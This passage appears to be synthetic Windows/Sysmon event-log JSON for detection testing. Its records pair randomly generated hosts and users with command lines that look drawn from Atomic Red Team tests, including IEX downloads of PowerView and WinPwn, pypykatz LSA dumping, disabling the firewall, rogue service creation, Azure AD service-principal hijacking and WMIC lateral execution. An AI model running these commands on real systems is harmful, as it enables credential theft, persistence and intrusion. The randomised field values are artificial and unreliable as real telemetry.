        "CommandLine": "\"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\\nIEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Find-GPOComputerAdmin -ComputerName #{computer_name} -Verbose\\n\",",
        "LogonID": 428956,
        "LogonGuid": "2f87fbd4-b144-4b2a-8e57-e2c0ef7653e0",
        "SourceProcessID": 5715,
        "SourceProcessName": "malware.exe",
        "SourceImage": "C:\\Program Files\\term..dll",
        "DestinationProcessID": 8515,
        "DestinationProcessName": "cmd.exe",
        "DestinationImage": "C:\\Users\\Public\\appear..exe",
        "UtcTime": "2024-05-17T01:36:51.697774Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "web-01.green.com",
        "User": "zmyers",
        "ProcessID": 2561,
        "ProcessName": "regsvr32.exe",
        "CommandLine": "\"reg query \\\"HKEY_LOCAL_MACHINE\\\\Software\\\\Microsoft\\\\Internet Explorer\\\" /v svcVersion\\n\",",
        "LogonID": 223006,
        "LogonGuid": "ec1a6e55-30cb-4f5e-b11a-bb4573ccdf30",
        "SourceProcessID": 9810,
        "SourceProcessName": "powershell.exe",
        "SourceImage": "C:\\Program Files\\sign..exe",
        "DestinationProcessID": 3403,
        "DestinationProcessName": "nc.exe",
        "DestinationImage": "C:\\Program Files\\player..dll",
        "UtcTime": "2024-05-17T01:36:51.698774Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "srv-77.james-manning.com",
        "User": "wmartin",
        "ProcessID": 3136,
        "ProcessName": "nc.exe",
        "CommandLine": "\"C:\\\\Windows\\\\Microsoft.NET\\\\Framework\\\\v4.0.30319\\\\csc.exe /r:System.EnterpriseServices.dll /out:\\\"#{output_file}\\\" /target:library \\\"#{source_file}\\\"\\nC:\\\\Windows\\\\Microsoft.NET\\\\Framework\\\\v4.0.30319\\\\regasm.exe /U #{output_file}\\n\",",
        "LogonID": 473264,
        "LogonGuid": "0b07be40-5ef6-411d-8a64-233bc83dc322",
        "SourceProcessID": 1386,
        "SourceProcessName": "backdoor.exe",
        "SourceImage": "C:\\Program Files\\safe..exe",
        "DestinationProcessID": 2108,
        "DestinationProcessName": "backdoor.exe",
        "DestinationImage": "C:\\Users\\Public\\guy..exe",
        "UtcTime": "2024-05-17T01:36:51.698774Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "db-56.mann.com",
        "User": "sherrycrane",
        "ProcessID": 7962,
        "ProcessName": "cmd.exe",
        "CommandLine": "\"New-PSDrive -PSProvider registry -Root HKEY_CLASSES_ROOT -Name HKCR\\nGet-ChildItem -Path HKCR:\\\\CLSID -Name | Select -Skip 1 > $env:temp\\\\clsids.txt\\nForEach($CLSID in Get-Content \\\"$env:temp\\\\clsids.txt\\\")\\n{try{write-output \\\"$($Position)-$($CLSID)\\\"\\nwrite-output \\\"------------\\\"| out-file #{output_file} -append\\nwrite-output $($CLSID)| out-file #{output_file} -append\\n$handle=[activator]::CreateInstance([type]::GetTypeFromCLSID($CLSID))\\n$handle | get-member -erroraction silentlycontinue | out-file #{output_file} -append\\n$position += 1} catch{}}\\n\",",
        "LogonID": 930092,
        "LogonGuid": "05562aa9-ffe4-48e8-8232-bca8d05ababf",
        "SourceProcessID": 7304,
        "SourceProcessName": "regsvr32.exe",
        "SourceImage": "C:\\Users\\Public\\him..exe",
        "DestinationProcessID": 8970,
        "DestinationProcessName": "taskmgr.exe",
        "DestinationImage": "C:\\Windows\\political..exe",
        "UtcTime": "2024-05-17T01:36:51.698774Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "email-50.cox.com",
        "User": "vanessa33",
        "ProcessID": 6718,
        "ProcessName": "cmd.exe",
        "CommandLine": "\"get-acl REGISTRY::HKLM\\\\SYSTEM\\\\CurrentControlSet\\\\Services\\\\* |FL\\nget-acl REGISTRY::HKLM\\\\SYSTEM\\\\CurrentControlSet\\\\Services\\\\#{weak_service_name} |FL\\n\",",
        "LogonID": 197940,
        "LogonGuid": "8bbc1db5-c014-4cd0-9fd3-ed8371fe9638",
        "SourceProcessID": 9702,
        "SourceProcessName": "taskmgr.exe",
        "SourceImage": "C:\\Windows\\level..exe",
        "DestinationProcessID": 7567,
        "DestinationProcessName": "taskmgr.exe",
        "DestinationImage": "C:\\Users\\Public\\risk..dll",
        "UtcTime": "2024-05-17T01:36:51.698774Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "laptop-67.johnson.com",
        "User": "coopercharlene",
        "ProcessID": 9656,
        "ProcessName": "rundll32.exe",
        "CommandLine": "\"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\\nIEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainController -verbose\\n\",",
        "LogonID": 643896,
        "LogonGuid": "28ee6f34-ba7f-4d32-b7a9-9c3e79794854",
        "SourceProcessID": 2004,
        "SourceProcessName": "regsvr32.exe",
        "SourceImage": "C:\\Program Files\\factor..exe",
        "DestinationProcessID": 3835,
        "DestinationProcessName": "nc.exe",
        "DestinationImage": "C:\\Windows\\pattern..exe",
        "UtcTime": "2024-05-17T01:36:51.699773Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "srv-60.johnson.com",
        "User": "wluna",
        "ProcessID": 1524,
        "ProcessName": "regsvr32.exe",
        "CommandLine": "\"netsh advfirewall firewall add rule name=\\\"atomic testing\\\" action=allow dir=in protocol=TCP localport=450 \\n\",",
        "LogonID": 857918,
        "LogonGuid": "58096189-c430-47bb-9425-c1e5b3222a05",
        "SourceProcessID": 4201,
        "SourceProcessName": "cmd.exe",
        "SourceImage": "C:\\Program Files\\at..dll",
        "DestinationProcessID": 6276,
        "DestinationProcessName": "explorer.exe",
        "DestinationImage": "C:\\Users\\Public\\spring..exe",
        "UtcTime": "2024-05-17T01:36:51.699773Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "desktop-66.martin.biz",
        "User": "rodriguezstephanie",
        "ProcessID": 5876,
        "ProcessName": "malware.exe",
        "CommandLine": "\"\\\"#{recon_commands}\\\"\\n\",",
        "LogonID": 391394,
        "LogonGuid": "a95bec03-530d-4683-9ac4-2a4b7e713d40",
        "SourceProcessID": 9909,
        "SourceProcessName": "cmd.exe",
        "SourceImage": "C:\\Windows\\model..dll",
        "DestinationProcessID": 4144,
        "DestinationProcessName": "backdoor.exe",
        "DestinationImage": "C:\\Users\\Public\\word..exe",
        "UtcTime": "2024-05-17T01:36:51.699773Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "laptop-85.hardy-curry.com",
        "User": "allenlori",
        "ProcessID": 6297,
        "ProcessName": "taskmgr.exe",
        "CommandLine": "\"\\\"#{venv_path}\\\\Scripts\\\\pypykatz\\\" live lsa \\n\",",
        "LogonID": 708570,
        "LogonGuid": "d041e732-8e0b-43f9-8c07-6f1ef620bf36",
        "SourceProcessID": 8711,
        "SourceProcessName": "malware.exe",
        "SourceImage": "C:\\Users\\Public\\sell..exe",
        "DestinationProcessID": 2274,
        "DestinationProcessName": "mimikatz.exe",
        "DestinationImage": "C:\\Users\\Public\\customer..exe",
        "UtcTime": "2024-05-17T01:36:51.699773Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "email-07.harding.com",
        "User": "pacesue",
        "ProcessID": 4851,
        "ProcessName": "mimikatz.exe",
        "CommandLine": "\"net use c: #{share_name}\\nnet share test=#{share_name} /REMARK:\\\"test share\\\" /CACHE:No\\n\",",
        "LogonID": 866519,
        "LogonGuid": "a5959084-0a1c-4f11-8032-ae2d038e14f7",
        "SourceProcessID": 8659,
        "SourceProcessName": "powershell.exe",
        "SourceImage": "C:\\Users\\Public\\attack..dll",
        "DestinationProcessID": 1645,
        "DestinationProcessName": "regsvr32.exe",
        "DestinationImage": "C:\\Windows\\course..exe",
        "UtcTime": "2024-05-17T01:36:51.699773Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "desktop-19.snyder.com",
        "User": "catherineclark",
        "ProcessID": 5049,
        "ProcessName": "rundll32.exe",
        "CommandLine": "\"Import-Module -Name AzureAD\\n$PWord = ConvertTo-SecureString -String \\\"#{password}\\\" -AsPlainText -Force\\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \\\"#{username}\\\", $Pword\\nConnect-AzureAD -Credential $Credential > $null\\n\\n$sp = Get-AzureADServicePrincipal -SearchString \\\"#{service_principal_name}\\\" | Select-Object -First 1\\nif ($sp -eq $null) { Write-Warning \\\"Service Principal not found\\\"; exit }\\n\\n# in the context of an ART test (and not a real attack), we don't need to keep access for too long. In case the cleanup command isn't called, it's better to ensure that everything expires after 1 day so it doesn't leave this backdoor open for too long\\n$credNotAfter = (Get-Date).AddDays(1)\\n$certNotAfter = (Get-Date).AddDays(2) # certificate expiry must be later than cred expiry\\n\\n$cert = New-SelfSignedCertificate -DnsName \\\"atomicredteam.example.com\\\" -FriendlyName \\\"AtomicCert\\\" -CertStoreLocation Cert:\\\\CurrentUser\\\\My -KeyExportPolicy Exportable -Provider \\\"Microsoft Enhanced RSA and AES Cryptographic Provider\\\" -NotAfter $certNotAfter\\n$keyValue = [System.Convert]::ToBase64String($cert.GetRawCertData())\\nWrite-Host \\\"Generated certificate \\\"\\\"$($cert.Thumbprint)\\\"\\\"\\\"\\n\\nNew-AzureADServicePrincipalKeyCredential -ObjectId $sp.ObjectId -Type AsymmetricX509Cert -CustomKeyIdentifier \\\"AtomicTest\\\" -Usage Verify -Value $keyValue -EndDate $credNotAfter\\n\\nStart-Sleep -s 30\\n$tenant = Get-AzureADTenantDetail\\n$auth = Connect-AzureAD -TenantId $tenant.ObjectId -ApplicationId $sp.AppId -CertificateThumbprint $cert.Thumbprint\\nWrite-Host \\\"Application Hijacking worked. Logged in successfully as $($auth.Account.Id) of type $($auth.Account.Type)\\\"\\nWrite-Host \\\"End of Hijacking\\\"\\n\",",
        "LogonID": 856973,
        "LogonGuid": "026b472a-c9ff-40b9-be7c-ec0753f50bc7",
        "SourceProcessID": 1100,
        "SourceProcessName": "nc.exe",
        "SourceImage": "C:\\Program Files\\war..dll",
        "DestinationProcessID": 1275,
        "DestinationProcessName": "explorer.exe",
        "DestinationImage": "C:\\Users\\Public\\charge..exe",
        "UtcTime": "2024-05-17T01:36:51.700774Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "db-12.gallagher-carter.com",
        "User": "jessicadominguez",
        "ProcessID": 9817,
        "ProcessName": "taskmgr.exe",
        "CommandLine": "\"reg add \\\"HKEY_LOCAL_MACHINE\\\\SYSTEM\\\\CurrentControlSet\\\\Services\\\\SharedAccess\\\\Parameters\\\\FirewallPolicy\\\\PublicProfile\\\" /v \\\"EnableFirewall\\\" /t REG_DWORD /d 0 /f\\n\",",
        "LogonID": 354598,
        "LogonGuid": "d24004f1-f200-4811-a721-b370ce01ee06",
        "SourceProcessID": 5631,
        "SourceProcessName": "explorer.exe",
        "SourceImage": "C:\\Program Files\\and..dll",
        "DestinationProcessID": 3915,
        "DestinationProcessName": "explorer.exe",
        "DestinationImage": "C:\\Windows\\walk..dll",
        "UtcTime": "2024-05-17T01:36:51.700774Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "srv-22.jones-lewis.com",
        "User": "stephanierodriguez",
        "ProcessID": 3011,
        "ProcessName": "cmd.exe",
        "CommandLine": "\"cscript \\\"#{vbscript}\\\" > $env:TEMP\\\\T1059.005.out.txt\\n\",",
        "LogonID": 791313,
        "LogonGuid": "92d4ac1e-008e-4487-b0a4-4c9ddf1ffd2f",
        "SourceProcessID": 7520,
        "SourceProcessName": "regsvr32.exe",
        "SourceImage": "C:\\Program Files\\anything..dll",
        "DestinationProcessID": 1183,
        "DestinationProcessName": "nc.exe",
        "DestinationImage": "C:\\Program Files\\amount..dll",
        "UtcTime": "2024-05-17T01:36:51.700774Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "desktop-08.perez-brown.com",
        "User": "brentdiaz",
        "ProcessID": 8919,
        "ProcessName": "explorer.exe",
        "CommandLine": "\"sc.exe create \\\"WerFaultSvc\\\" binPath= \\\"$env:windir\\\\WinSxS\\\\x86_microsoft-windows-errorreportingfaults_31bf3856ad364e35_4.0.9600.16384_none_a13f7e283339a050\\\\WerFault.exe\\\" DisplayName= \\\"WerFault Service\\\" start= auto\\n\",",
        "LogonID": 750388,
        "LogonGuid": "dc81bcef-eac1-48b7-9e1e-a4adbc8adba2",
        "SourceProcessID": 6774,
        "SourceProcessName": "explorer.exe",
        "SourceImage": "C:\\Windows\\fund..dll",
        "DestinationProcessID": 6074,
        "DestinationProcessName": "regsvr32.exe",
        "DestinationImage": "C:\\Program Files\\clearly..exe",
        "UtcTime": "2024-05-17T01:36:51.700774Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "db-19.benjamin.com",
        "User": "brendawallace",
        "ProcessID": 1084,
        "ProcessName": "backdoor.exe",
        "CommandLine": "\"cat /etc/pam.d/common-password\\n\",",
        "LogonID": 820415,
        "LogonGuid": "b9d2459e-37b4-413d-86a2-a2adb7f789c6",
        "SourceProcessID": 3120,
        "SourceProcessName": "powershell.exe",
        "SourceImage": "C:\\Windows\\keep..dll",
        "DestinationProcessID": 5130,
        "DestinationProcessName": "powershell.exe",
        "DestinationImage": "C:\\Users\\Public\\money..dll",
        "UtcTime": "2024-05-17T01:36:51.700774Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "lt-69.smith.com",
        "User": "bdavis",
        "ProcessID": 1354,
        "ProcessName": "backdoor.exe",
        "CommandLine": "\"$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\\nGeneralrecon -consoleoutput -noninteractive\",",
        "LogonID": 772998,
        "LogonGuid": "fc57f4d0-b2cd-49b9-8f18-b554fac8c79a",
        "SourceProcessID": 1116,
        "SourceProcessName": "nc.exe",
        "SourceImage": "C:\\Program Files\\choose..exe",
        "DestinationProcessID": 5538,
        "DestinationProcessName": "regsvr32.exe",
        "DestinationImage": "C:\\Users\\Public\\strong..dll",
        "UtcTime": "2024-05-17T01:36:51.701774Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "srv-03.bishop.net",
        "User": "nicholas61",
        "ProcessID": 6313,
        "ProcessName": "malware.exe",
        "CommandLine": "\"copy \\\"#{dllfilename}\\\" %systemroot%\\\\system32\\\\\\nsc create W64Time binPath= \\\"c:\\\\Windows\\\\System32\\\\svchost.exe -k TimeService\\\" type= share start=auto\\nsc config W64Time DisplayName= \\\"Windows 64 Time\\\"\\nsc description W64Time \\\"Maintain date and time synch on all clients and services in the network\\\"\\nreg add \\\"HKLM\\\\Software\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Svchost\\\" /v TimeService /t REG_MULTI_SZ /d \\\"W64Time\\\" /f\\nreg add \\\"HKLM\\\\SYSTEM\\\\CurrentControlSet\\\\Services\\\\W64Time\\\\Parameters\\\" /v ServiceDll /t REG_EXPAND_SZ /d \\\"%systemroot%\\\\system32\\\\w64time.dll\\\" /f\\nsc start W64Time\",",
        "LogonID": 846036,
        "LogonGuid": "a929e349-eb6e-418c-8516-770654232be5",
        "SourceProcessID": 2897,
        "SourceProcessName": "explorer.exe",
        "SourceImage": "C:\\Windows\\suggest..exe",
        "DestinationProcessID": 6194,
        "DestinationProcessName": "malware.exe",
        "DestinationImage": "C:\\Program Files\\leave..dll",
        "UtcTime": "2024-05-17T01:36:51.701774Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "db-31.johnson.com",
        "User": "hlewis",
        "ProcessID": 2512,
        "ProcessName": "rundll32.exe",
        "CommandLine": "\"cat /etc/passwd |grep nobody \\n# -> nobody:x:65534:65534:Unprivileged user:/nonexistent:/usr/sbin/nologin\\npw usermod nobody -s /bin/sh\\necho $(openssl passwd -1 art) | pw mod user nobody -h 0\\nsu nobody\\nwhoami\\nexit\\n\",",
        "LogonID": 514439,
        "LogonGuid": "b04f3186-d5ec-40a0-81e8-1d837ca01c3c",
        "SourceProcessID": 8728,
        "SourceProcessName": "rundll32.exe",
        "SourceImage": "C:\\Windows\\positive..exe",
        "DestinationProcessID": 7217,
        "DestinationProcessName": "mimikatz.exe",
        "DestinationImage": "C:\\Windows\\example..dll",
        "UtcTime": "2024-05-17T01:36:51.701774Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "laptop-05.russell-castillo.biz",
        "User": "jamesroberts",
        "ProcessID": 6678,
        "ProcessName": "malware.exe",
        "CommandLine": "\"$machine_list = \\\"PathToAtomicsFolder\\\\..\\\\ExternalPayloads\\\\T1105MachineList.txt\\\"\\n$offline_list = \\\"PathToAtomicsFolder\\\\..\\\\ExternalPayloads\\\\T1105OfflineHosts.txt\\\"\\n$completed_list = \\\"PathToAtomicsFolder\\\\..\\\\ExternalPayloads\\\\T1105CompletedHosts.txt\\\"\\nforeach ($machine in get-content -path \\\"$machine_list\\\")\\n{if (test-connection -Count 1 -computername $machine -quiet) \\n{cmd /c copy \\\"#{binary_file}\\\" \\\"\\\\\\\\$machine\\\\#{remote_drive_letter}$#{exe_remote_folder}\\\"\\necho $machine >> \\\"$completed_list\\\"\\nwmic /node: \\\"$machine\\\" process call create \\\"regsvr32.exe /i #{remote_drive_letter}:#{exe_remote_folder}\\\"}\\nelse\\n{echo $machine >> \\\"$offline_list\\\"}}\\n\",",
        "LogonID": 613591,
        "LogonGuid": "86238fc3-f205-4baa-83eb-a2b8fa935e12",
        "SourceProcessID": 2508,
        "SourceProcessName": "powershell.exe",
        "SourceImage": "C:\\Windows\\he..dll",
        "DestinationProcessID": 2568,
        "DestinationProcessName": "cmd.exe",
        "DestinationImage": "C:\\Program Files\\me..exe",
        "UtcTime": "2024-05-17T01:36:51.701774Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "db-84.savage.com",
        "User": "michael94",
        "ProcessID": 9030,
        "ProcessName": "mimikatz.exe",
        "CommandLine": "\"net user /domain\\nnet group /domain\\n\",",
        "LogonID": 562063,
        "LogonGuid": "fa4c6f84-1d84-403a-a46f-90a36f01e078",
        "SourceProcessID": 6147,
        "SourceProcessName": "backdoor.exe",
        "SourceImage": "C:\\Program Files\\firm..dll",
        "DestinationProcessID": 7711,
        "DestinationProcessName": "regsvr32.exe",
        "DestinationImage": "C:\\Users\\Public\\health..dll",
        "UtcTime": "2024-05-17T01:36:51.701774Z"
    },
